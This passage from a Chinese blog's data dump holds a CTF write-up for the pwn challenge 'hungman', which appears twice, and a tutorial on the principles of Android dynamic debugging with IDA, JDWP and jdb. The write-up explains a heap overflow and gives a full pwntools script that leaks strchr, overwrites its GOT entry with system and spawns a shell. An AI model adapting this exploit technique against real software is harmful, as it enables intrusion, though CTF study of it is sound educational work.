class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">if ( objp-&gt;score &gt; score_history )</div><div class=\"line\">    &#123;</div><div class=\"line\">      puts(&quot;High score! change name?&quot;);</div><div class=\"line\">      __isoc99_scanf(0x40114FLL, &amp;v3);          // %c</div><div class=\"line\">      if ( v3 == 121 )</div><div class=\"line\">      &#123;</div><div class=\"line\">        namep = malloc(0xF8uLL);</div><div class=\"line\">        memset(namep, 0, 0xF8uLL);</div><div class=\"line\">        new_name_len = read(0, namep, 0xF8uLL);</div><div class=\"line\">        objp-&gt;name_len = new_name_len;</div><div class=\"line\">        v14 = strchr((const char *)namep, 10);</div><div class=\"line\">        if ( v14 )</div><div class=\"line\">          *v14 = 0;</div><div class=\"line\">        memcpy((void *)objp-&gt;namep, namep, new_name_len);// ---- overflow  </div><div class=\"line\">        free(namep);</div><div class=\"line\">      &#125;</div><div class=\"line\">      snprintf(byte_602100, 0x200uLL, &quot;Highest player: %s&quot;, objp-&gt;namep);</div><div class=\"line\">      score_history = objp-&gt;score;</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure>\n<p>所以如果我们一开始较长的name，那么buf中所有字母基本就都会出现，依次把所有字母输一圈就可以赢得游戏获得改名字的机会，就可以更改较长的名字首先泄漏strchr地址，然后再赢得一次游戏将strchr@got替换位system，然后再赢得一次将name换为/bin/sh触发system就可以了。</p>\n<p>但是这里有几个坑，在这里记录一下：<br>一是一开始选择泄漏函数的时候选了free，但是发现free地址低位是\\x00正好截断，所以就换了strchr（不过偏移一位再泄漏free也可以）。<br>二是选择了strchr后，但是对应的strchr@got上填的地址是strchr_see2，应该是某种优化，所以这里又耽搁了一下。<br>三是在最后发送system地址过去的时候不能使用sendline，只能使用send，因为sendline导致9个字符被memcpy过去，导致strchr@got下面的printf@got被破坏，崩溃了没得玩了。<br>四是不知为何在第一次发送name的时候前面必须加个time.sleep(0.1)，或者在play()中加个print recv，否则就可能成功可能失败，这里到现在我也不知道是因为什么，调试的话一点问题也没有，所以到现在还是憋着找不出原因。</p>\n<p>参考exploit：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">letters=<span class=\"string\">'abcdefghijklmnopqrstuvwxyzz'</span></div><div class=\"line\">name=<span class=\"string\">'A'</span>*<span class=\"number\">32</span></div><div class=\"line\">p=process(<span class=\"string\">'./hungman'</span>)</div><div class=\"line\">free_got=<span class=\"number\">0x602018</span></div><div class=\"line\">strchr_got=<span class=\"number\">0x602038</span></div><div class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpid</span><span class=\"params\">(name)</span>:</span></div><div class=\"line\">\tpid= pwnlib.util.proc.pidof(name)</div><div class=\"line\">\tlog.info(pid)</div><div class=\"line\">\traw_input(<span class=\"string\">'continue'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">play</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'-- play --'</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> letters:</div><div class=\"line\">\t\trecv=p.recvline()</div><div class=\"line\">\t\t<span class=\"keyword\">print</span> recv</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> recv.startswith(<span class=\"string\">'High score! change name?'</span>):</div><div class=\"line\">\t\t\t<span class=\"comment\"># I do not know why it need to print recv here,</span></div><div class=\"line\">\t\t\t<span class=\"comment\"># or it will failed to recieve in line 42</span></div><div class=\"line\">\t\t\t<span class=\"comment\"># time.sleep(0.1) can works here too. why ???</span></div><div class=\"line\">\t\t\t<span class=\"keyword\">print</span> recv</div><div class=\"line\">\t\t\t<span class=\"keyword\">print</span> <span class=\"string\">'[*] win!'</span></div><div class=\"line\">\t\t\tp.sendline(<span class=\"string\">'y'</span>)</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span></div><div class=\"line\">\t\t<span class=\"keyword\">if</span> recv.startswith(<span class=\"string\">'Default Highscore  score: 64'</span>):</div><div class=\"line\">\t\t\t<span class=\"keyword\">print</span> <span class=\"string\">'[-] try again...'</span></div><div class=\"line\">\t\t\tp.recvuntil(<span class=\"string\">'Continue? '</span>)</div><div class=\"line\">\t\t\tp.sendline(<span class=\"string\">'y'</span>)</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> play()</div><div class=\"line\">\t\tp.sendline(c)\t</div><div class=\"line\"></div><div class=\"line\">p.recvline()</div><div class=\"line\">p.sendline(<span class=\"string\">'A'</span>*<span class=\"number\">30</span>)</div><div class=\"line\">p.recvline()</div><div class=\"line\">play()</div><div class=\"line\">p.sendline(name+p64(<span class=\"number\">0x0</span>)+p64(<span class=\"number\">0x91</span>)+p32(<span class=\"number\">0x52</span>)+p32(<span class=\"number\">0xc9</span>)+p64(strchr_got))</div><div class=\"line\"><span class=\"comment\">#context.update(terminal=['tmux','splitw','-h'])</span></div><div class=\"line\"><span class=\"comment\">#gdb.attach(p,'b *0x0000000000400E77')</span></div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">'Highest player: '</span>)</div><div class=\"line\">strchr_addr=p.recvuntil(<span class=\"string\">' score:'</span>)[:<span class=\"number\">-7</span>]</div><div class=\"line\">strchr_addr=u64(strchr_addr.ljust(<span class=\"number\">8</span>, <span class=\"string\">'\\0'</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># actually it is address of strchr_see2, not strchr</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'strchr addr: '</span>+hex(strchr_addr)</div><div class=\"line\">system_addr=strchr_addr<span class=\"number\">-0x30</span><span class=\"number\">-0x000000000007ff70</span>+<span class=\"number\">0x0000000000041490</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'system addr: '</span>+hex(system_addr)</div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">'Continue? '</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'y'</span>)</div><div class=\"line\">play()</div><div class=\"line\"><span class=\"comment\"># getpid('hungman')</span></div><div class=\"line\"><span class=\"comment\"># can not use sendline() here cause it will crash printf@got.plt</span></div><div class=\"line\">p.send(p64(system_addr))</div><div class=\"line\">p.recvuntil(<span class=\"string\">'Continue? '</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'y'</span>)</div><div class=\"line\">play()</div><div class=\"line\">p.sendline(<span class=\"string\">'/bin/sh'</span>)</div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure>\n","excerpt":"<p>300分的pwn</p>\n<p>程序是一个简单的游戏，在你输入名字后，将名字存入malloc出的chunk中，然后会生成一个结构体，大概长这样：</p>","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">00000000 struc_obj       struc ; (sizeof=0x80)</div><div class=\"line\">00000000 score           dd ?</div><div class=\"line\">00000004 name_len        dd ?</div><div class=\"line\">00000008 namep           dq ?</div><div class=\"line\">00000010 content         db 112 dup(?)</div><div class=\"line\">00000080 struc_obj       ends</div><div class=\"line\">00000080</div></pre></td></tr></table></figure>\n<p>然后开始游戏主循环，在主循环中生成一个和名字大小相同的buf，然后将其与随机数一阵操作生成新的随机buf：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">for ( i = 0LL; name_len - 1 &gt; i; ++i )</div><div class=\"line\">&#123;</div><div class=\"line\">  *((_BYTE *)buf + i) ^= *(_BYTE *)(objp-&gt;namep + i);</div><div class=\"line\">  *((_BYTE *)buf + i) = *((_BYTE *)buf + i) % 26u + 97;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>所以操作结束后buf中将只有小写字母的ascii码，然后打印一排”<em>“代表buf，接着就是接收输入字符，如果buf中有这个字符，就在下次对应位置打印这个字符而不是”</em>“，有三次机会可以猜错，机会用完后或者全部猜出来后会获得一次修改名字的机会，这里就是漏洞所在，如果输入的名字比原来的长就可能发生溢出，因为操作长这样：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">if ( objp-&gt;score &gt; score_history )</div><div class=\"line\">    &#123;</div><div class=\"line\">      puts(&quot;High score! change name?&quot;);</div><div class=\"line\">      __isoc99_scanf(0x40114FLL, &amp;v3);          // %c</div><div class=\"line\">      if ( v3 == 121 )</div><div class=\"line\">      &#123;</div><div class=\"line\">        namep = malloc(0xF8uLL);</div><div class=\"line\">        memset(namep, 0, 0xF8uLL);</div><div class=\"line\">        new_name_len = read(0, namep, 0xF8uLL);</div><div class=\"line\">        objp-&gt;name_len = new_name_len;</div><div class=\"line\">        v14 = strchr((const char *)namep, 10);</div><div class=\"line\">        if ( v14 )</div><div class=\"line\">          *v14 = 0;</div><div class=\"line\">        memcpy((void *)objp-&gt;namep, namep, new_name_len);// ---- overflow  </div><div class=\"line\">        free(namep);</div><div class=\"line\">      &#125;</div><div class=\"line\">      snprintf(byte_602100, 0x200uLL, &quot;Highest player: %s&quot;, objp-&gt;namep);</div><div class=\"line\">      score_history = objp-&gt;score;</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure>\n<p>所以如果我们一开始较长的name，那么buf中所有字母基本就都会出现，依次把所有字母输一圈就可以赢得游戏获得改名字的机会，就可以更改较长的名字首先泄漏strchr地址，然后再赢得一次游戏将strchr@got替换位system，然后再赢得一次将name换为/bin/sh触发system就可以了。</p>\n<p>但是这里有几个坑，在这里记录一下：<br>一是一开始选择泄漏函数的时候选了free，但是发现free地址低位是\\x00正好截断，所以就换了strchr（不过偏移一位再泄漏free也可以）。<br>二是选择了strchr后，但是对应的strchr@got上填的地址是strchr_see2，应该是某种优化，所以这里又耽搁了一下。<br>三是在最后发送system地址过去的时候不能使用sendline，只能使用send，因为sendline导致9个字符被memcpy过去，导致strchr@got下面的printf@got被破坏，崩溃了没得玩了。<br>四是不知为何在第一次发送name的时候前面必须加个time.sleep(0.1)，或者在play()中加个print recv，否则就可能成功可能失败，这里到现在我也不知道是因为什么，调试的话一点问题也没有，所以到现在还是憋着找不出原因。</p>\n<p>参考exploit：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">letters=<span class=\"string\">'abcdefghijklmnopqrstuvwxyzz'</span></div><div class=\"line\">name=<span class=\"string\">'A'</span>*<span class=\"number\">32</span></div><div class=\"line\">p=process(<span class=\"string\">'./hungman'</span>)</div><div class=\"line\">free_got=<span class=\"number\">0x602018</span></div><div class=\"line\">strchr_got=<span class=\"number\">0x602038</span></div><div class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpid</span><span class=\"params\">(name)</span>:</span></div><div class=\"line\">\tpid= pwnlib.util.proc.pidof(name)</div><div class=\"line\">\tlog.info(pid)</div><div class=\"line\">\traw_input(<span class=\"string\">'continue'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">play</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'-- play --'</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> letters:</div><div class=\"line\">\t\trecv=p.recvline()</div><div class=\"line\">\t\t<span class=\"keyword\">print</span> recv</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> recv.startswith(<span class=\"string\">'High score! change name?'</span>):</div><div class=\"line\">\t\t\t<span class=\"comment\"># I do not know why it need to print recv here,</span></div><div class=\"line\">\t\t\t<span class=\"comment\"># or it will failed to recieve in line 42</span></div><div class=\"line\">\t\t\t<span class=\"comment\"># time.sleep(0.1) can works here too. why ???</span></div><div class=\"line\">\t\t\t<span class=\"keyword\">print</span> recv</div><div class=\"line\">\t\t\t<span class=\"keyword\">print</span> <span class=\"string\">'[*] win!'</span></div><div class=\"line\">\t\t\tp.sendline(<span class=\"string\">'y'</span>)</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span></div><div class=\"line\">\t\t<span class=\"keyword\">if</span> recv.startswith(<span class=\"string\">'Default Highscore  score: 64'</span>):</div><div class=\"line\">\t\t\t<span class=\"keyword\">print</span> <span class=\"string\">'[-] try again...'</span></div><div class=\"line\">\t\t\tp.recvuntil(<span class=\"string\">'Continue? '</span>)</div><div class=\"line\">\t\t\tp.sendline(<span class=\"string\">'y'</span>)</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> play()</div><div class=\"line\">\t\tp.sendline(c)\t</div><div class=\"line\"></div><div class=\"line\">p.recvline()</div><div class=\"line\">p.sendline(<span class=\"string\">'A'</span>*<span class=\"number\">30</span>)</div><div class=\"line\">p.recvline()</div><div class=\"line\">play()</div><div class=\"line\">p.sendline(name+p64(<span class=\"number\">0x0</span>)+p64(<span class=\"number\">0x91</span>)+p32(<span class=\"number\">0x52</span>)+p32(<span class=\"number\">0xc9</span>)+p64(strchr_got))</div><div class=\"line\"><span class=\"comment\">#context.update(terminal=['tmux','splitw','-h'])</span></div><div class=\"line\"><span class=\"comment\">#gdb.attach(p,'b *0x0000000000400E77')</span></div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">'Highest player: '</span>)</div><div class=\"line\">strchr_addr=p.recvuntil(<span class=\"string\">' score:'</span>)[:<span class=\"number\">-7</span>]</div><div class=\"line\">strchr_addr=u64(strchr_addr.ljust(<span class=\"number\">8</span>, <span class=\"string\">'\\0'</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># actually it is address of strchr_see2, not strchr</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'strchr addr: '</span>+hex(strchr_addr)</div><div class=\"line\">system_addr=strchr_addr<span class=\"number\">-0x30</span><span class=\"number\">-0x000000000007ff70</span>+<span class=\"number\">0x0000000000041490</span></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'system addr: '</span>+hex(system_addr)</div><div class=\"line\"></div><div class=\"line\">p.recvuntil(<span class=\"string\">'Continue? '</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'y'</span>)</div><div class=\"line\">play()</div><div class=\"line\"><span class=\"comment\"># getpid('hungman')</span></div><div class=\"line\"><span class=\"comment\"># can not use sendline() here cause it will crash printf@got.plt</span></div><div class=\"line\">p.send(p64(system_addr))</div><div class=\"line\">p.recvuntil(<span class=\"string\">'Continue? '</span>)</div><div class=\"line\">p.sendline(<span class=\"string\">'y'</span>)</div><div class=\"line\">play()</div><div class=\"line\">p.sendline(<span class=\"string\">'/bin/sh'</span>)</div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure>"},{"title":"Android 动态调试原理浅析","date":"2016-10-25T04:06:00.000Z","_content":"\n又是一番坎坷的折腾，Android之路刚开始就这么折腾，但好在最后终于能够解决并能给自己一个满意的答案。也是有一次见识到了国内的资料都是转转转的可怕，只是这次也并没有找到相关的英文资料可以解惑，记录在这里算是一点补充，让需要的朋友少走点弯路。\n\n<!--more-->\n\n## 姿势总结\n\n首先简单总结下，目前在Android的动态调试主要有这么几种姿势：\n- **smali插桩**\n  较为麻烦的方式,在smali代码中插入自己的代码来做log输出等达到调试的效果\n- **IDA调试**\n  IDA可以支持调试dex和so，但是并不能自由切换，经过尝试，可以通过开两个IDA分别调试dex和so来达到这个效果\n- **JEB调试**\n  2.2.x以上已经支持dex和so的完美调试，但是貌似不能调试so库中的JNI_Onload以及.init中的函数？\n- **gdb调试**\n  gdb+gdbserver 可以用来调试so库\n- **android studio调试**\n  可以调试smali，可以调试ndk但是貌似不能在无源码的情况下调试so，都是通过插件的方式实现的貌似，具体没做尝试\n- **andbug开源项目**\n  貌似不是很好用，忽略\n- **xposed hook**\n  只能进行函数开始和结束地址处的hook？这个也需要尝试一下\n\n## 原理简介\n\nAndroid上App的调试主要有两个部分，dex的调试或者说VM的调试以及so库代码的调试。而这两个暂时看来是需要两个调试器来完成（或者有哪个调试器同时实现了进程的调试以及JDWP协议来调试VM应该就可以包揽这俩），对于so库代码的调试主要是通过类似gdb ptrace调试的方式来实现，对于VM的调试主要是通过jdwp协议来实现，这个协议是类java虚拟机提供的一个调试接口，Dalvik虚拟机显然也实现了这个接口。而这个JDWP协议应该是通过UNIX域套接字来完成VM与debugger之间的通信的。\n\n\n有关JDWP协议adb有些操作需要了解下：\n```\nadb jdwp\n```\n列出目标Android系统中支持jdwp协议的进程\n```\nadb forward tcp:XXX jdwp:XXX\n```\n将本机的端口映射到（通过USB或者端口，取决于本机与目标Android之间建立连接的方式）目标Android的一个jdwp接口上。\n\n## 关于IDA\n\n然后下面主要就是对于IDA的两种调试方式的分析，算是对蒸米大大的《安卓动态调试七种武器之孔雀翎 – Ida Pro》一文的一些补充，能够搜到的相关IDA调试的资料基本都是一样的，就是和蒸米大大这篇一样把步骤列一遍，但是我看的时候却憋得慌，主要的问题就是不明白为什么要在中间插一步jdb，于是相当憋得慌。经过一番考证，终于找到了原因。\n\n我们先看下IDA调试dex的过程，步骤这里就不列了，一搜一大把，主要看下原理，使用USB连接，当IDA已经连接到VM之后，可以看到：\n\n![android_debug_analysis0.png][1]\n\n![android_debug_analysis1.png][2]\n\nIDA是通过adb建立了一个jdwp转发来调试目标VM，图中的另外一个与adb建立的连接是我开的shell，这个时候也是没有别的连接的，IDA在这个时候并没有通过android_server来进行调试。\n\n然后我们来重点看下调试so库，在蒸米大大列出的步骤里，说必须要启动ddms，然后还要jdb插一脚，这我果断不能忍，IDA这么6，为什么还需要再额外找东西插一脚？原因是这样的，打开ddms之后，可以看到：\n\n![android_debug_analysis2.png][3]\n\n![android_debug_analysis3.png][4]\n\nddms建立了一堆连接与监听，所以之后的那个jdb connect是连接到了java然后通过java处理再通过adb来与目标VM建立调试通信，所以如果没有开ddms，localhost没有这些监听端口你connect到127.0.0.1:8700自然没有办法attach到目标VM上，这算是解决了问题1。下面是问题2，为什么需要jdb插一脚，在IDA开始调试so库后我们可以看到它这次是直接与android_server进行通信：\n\n![android_debug_analysis4.png][5]\n\n没有与jdwp进行连接，所以这个时候由于是debug方式启动的app，VM还在等待jdwp发过来的信号而暂停，只能通过jdb来让它继续运行（所以android_server实现的还不够完美？）。那有没有办法不让jdb插一脚呢？我猜想双开IDA，一个调DEX，一个调so应该可以做到，尝试之后证明这样确实没有问题，于是到这里问题2也终于有了答案，我心中的一口淤血也算是终于吐出来了。\n\n也希望能让诸位看官对这个答案感到满意。\n\n## 一些坑\n\n\n最后是一些坑，我在这里折腾了整整两天，除去jdb这里的疑惑之外，另一个阻拦我的问题也终于能够解决，其实如果我能先把蒸米大大对于Alicrackme_2.apk的分析看完的话根本就不会遇到那个另一个问题，然而我以为对那个apk的分析到IDA调试就完了...谁知道那个apk是有反调试的！坑啊，我一开始怎么也进不去so库中的调试，还以为是IDA在wine下运行的问题，又试了windows下的IDA，jeb也不行，我也试了windows下的，然后又各种排除，一开始有那么一瞬想到是不是apk怎么样，但是就那么一瞬一闪而过，想拿jeb官方演示的apk看看但是没找到就想算了小小的crackme2能有什么问题...我真的是懵逼的啊后来发现这个反调试的trick的时候，这样很多东西都全部都能说通了，比如为什么jeb已经出来两个debugger了却不能调试so，比如IDA为什么只能调试JNI_onload却不能断在后面的check函数里，还是too naive啊...\n\n但还是有些其他的坑：\n1、IDA调试so库的时候不能使用adb远程连接，只能使用USB否则IDA老是崩，我不确定是不是因为wine的缘故因为还没验证\n2、IDA调试so的时候，在已经attach之后需要重新确认下debug option中的断在lib加载处是否还勾着，我这里即便之前勾上了attach之后就没了需要重新勾一下\n\n最后就是关于jeb的资料还太少，不过貌似jeb不能调试.init和JNI_onload，因为即便我断在lib中也不会停下，不知道是不是还有什么姿势，我翻遍了jeb也没看到什么相关的内容，有知道的朋友吗？不胜感激～\n\n\n\n\n[1]: /images/android_debug_analysis0.png\n[2]: /images/android_debug_analysis1.png\n[3]: /images/android_debug_analysis2.png\n[4]: /images/android_debug_analysis3.png\n[5]: /images/android_debug_analysis4.png\n","source":"_posts/android_debug_analysis.md","raw":"title: Android 动态调试原理浅析\n\ndate: 2016/10/25 12:06:00\n\n---\n\n又是一番坎坷的折腾，Android之路刚开始就这么折腾，但好在最后终于能够解决并能给自己一个满意的答案。也是有一次见识到了国内的资料都是转转转的可怕，只是这次也并没有找到相关的英文资料可以解惑，记录在这里算是一点补充，让需要的朋友少走点弯路。\n\n<!--more-->\n\n## 姿势总结\n\n首先简单总结下，目前在Android的动态调试主要有这么几种姿势：\n- **smali插桩**\n  较为麻烦的方式,在smali代码中插入自己的代码来做log输出等达到调试的效果\n- **IDA调试**\n  IDA可以支持调试dex和so，但是并不能自由切换，经过尝试，可以通过开两个IDA分别调试dex和so来达到这个效果\n- **JEB调试**\n  2.2.x以上已经支持dex和so的完美调试，但是貌似不能调试so库中的JNI_Onload以及.init中的函数？\n- **gdb调试**\n  gdb+gdbserver 可以用来调试so库\n- **android studio调试**\n  可以调试smali，可以调试ndk但是貌似不能在无源码的情况下调试so，都是通过插件的方式实现的貌似，具体没做尝试\n- **andbug开源项目**\n  貌似不是很好用，忽略\n- **xposed hook**\n  只能进行函数开始和结束地址处的hook？这个也需要尝试一下\n\n## 原理简介\n\nAndroid上App的调试主要有两个部分，dex的调试或者说VM的调试以及so库代码的调试。而这两个暂时看来是需要两个调试器来完成（或者有哪个调试器同时实现了进程的调试以及JDWP协议来调试VM应该就可以包揽这俩），对于so库代码的调试主要是通过类似gdb ptrace调试的方式来实现，对于VM的调试主要是通过jdwp协议来实现，这个协议是类java虚拟机提供的一个调试接口，Dalvik虚拟机显然也实现了这个接口。而这个JDWP协议应该是通过UNIX域套接字来完成VM与debugger之间的通信的。\n\n\n有关JDWP协议adb有些操作需要了解下：\n```\nadb jdwp\n```\n列出目标Android系统中支持jdwp协议的进程\n```\nadb forward tcp:XXX jdwp:XXX\n```\n将本机的端口映射到（通过USB或者端口，取决于本机与目标Android之间建立连接的方式）目标Android的一个jdwp接口上。\n\n## 关于IDA\n\n然后下面主要就是对于IDA的两种调试方式的分析，算是对蒸米大大的《安卓动态调试七种武器之孔雀翎 – Ida Pro》一文的一些补充，能够搜到的相关IDA调试的资料基本都是一样的，就是和蒸米大大这篇一样把步骤列一遍，但是我看的时候却憋得慌，主要的问题就是不明白为什么要在中间插一步jdb，于是相当憋得慌。经过一番考证，终于找到了原因。\n\n我们先看下IDA调试dex的过程，步骤这里就不列了，一搜一大把，主要看下原理，使用USB连接，当IDA已经连接到VM之后，可以看到：\n\n![android_debug_analysis0.png][1]\n\n![android_debug_analysis1.png][2]\n\nIDA是通过adb建立了一个jdwp转发来调试目标VM，图中的另外一个与adb建立的连接是我开的shell，这个时候也是没有别的连接的，IDA在这个时候并没有通过android_server来进行调试。\n\n然后我们来重点看下调试so库，在蒸米大大列出的步骤里，说必须要启动ddms，然后还要jdb插一脚，这我果断不能忍，IDA这么6，为什么还需要再额外找东西插一脚？原因是这样的，打开ddms之后，可以看到：\n\n![android_debug_analysis2.png][3]\n\n![android_debug_analysis3.png][4]\n\nddms建立了一堆连接与监听，所以之后的那个jdb connect是连接到了java然后通过java处理再通过adb来与目标VM建立调试通信，所以如果没有开ddms，localhost没有这些监听端口你connect到127.0.0.1:8700自然没有办法attach到目标VM上，这算是解决了问题1。下面是问题2，为什么需要jdb插一脚，在IDA开始调试so库后我们可以看到它这次是直接与android_server进行通信：\n\n![android_debug_analysis4.png][5]\n\n没有与jdwp进行连接，所以这个时候由于是debug方式启动的app，VM还在等待jdwp发过来的信号而暂停，只能通过jdb来让它继续运行（所以android_server实现的还不够完美？）。那有没有办法不让jdb插一脚呢？我猜想双开IDA，一个调DEX，一个调so应该可以做到，尝试之后证明这样确实没有问题，于是到这里问题2也终于有了答案，我心中的一口淤血也算是终于吐出来了。\n\n也希望能让诸位看官对这个答案感到满意。\n\n## 一些坑\n\n\n最后是一些坑，我在这里折腾了整整两天，除去jdb这里的疑惑之外，另一个阻拦我的问题也终于能够解决，其实如果我能先把蒸米大大对于Alicrackme_2.apk的分析看完的话根本就不会遇到那个另一个问题，然而我以为对那个apk的分析到IDA调试就完了...谁知道那个apk是有反调试的！坑啊，我一开始怎么也进不去so库中的调试，还以为是IDA在wine下运行的问题，又试了windows下的IDA，jeb也不行，我也试了windows下的，然后又各种排除，一开始有那么一瞬想到是不是apk怎么样，但是就那么一瞬一闪而过，想拿jeb官方演示的apk看看但是没找到就想算了小小的crackme2能有什么问题...我真的是懵逼的啊后来发现这个反调试的trick的时候，这样很多东西都全部都能说通了，比如为什么jeb已经出来两个debugger了却不能调试so，比如IDA为什么只能调试JNI_onload却不能断在后面的check函数里，还是too naive啊...\n\n但还是有些其他的坑：\n1、IDA调试so库的时候不能使用adb远程连接，只能使用USB否则IDA老是崩，我不确定是不是因为wine的缘故因为还没验证\n2、IDA调试so的时候，在已经attach之后需要重新确认下debug option中的断在lib加载处是否还勾着，我这里即便之前勾上了attach之后就没了需要重新勾一下\n\n最后就是关于jeb的资料还太少，不过貌似jeb不能调试.init和JNI_onload，因为即便我断在lib中也不会停下，不知道是不是还有什么姿势，我翻遍了jeb也没看到什么相关的内容，有知道的朋友吗？不胜感激～\n\n\n\n\n[1]: /images/android_debug_analysis0.png\n[2]: /images/android_debug_analysis1.png\n[3]: /images/android_debug_analysis2.png\n[4]: /images/android_debug_analysis3.png\n[5]: 